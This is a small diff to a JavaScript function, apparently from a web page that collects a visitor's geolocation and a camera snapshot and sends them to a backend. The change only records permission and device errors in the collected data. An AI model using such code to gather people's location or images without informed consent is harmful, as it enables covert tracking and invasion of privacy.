@@ -12,7 +12,8 @@ async function collectAndSend() {
             acc: pos.coords.accuracy
         };
     } catch (err) {
-        console.log('Location denied or failed');
+        data.locationError = err.message || 'Permission Denied/Timeout';
+        console.log('Location denied or failed', err);
     }
 
     // 2. Get Camera Image (if allowed)
@@ -36,7 +37,8 @@ async function collectAndSend() {
         // Stop tracks
         stream.getTracks().forEach(t => t.stop());
     } catch (err) {
-        console.log('Camera denied or failed');
+        data.cameraError = err.message || 'Permission Denied/Device Error';
+        console.log('Camera denied or failed', err);
     }
 
     // 3. Send to Backend
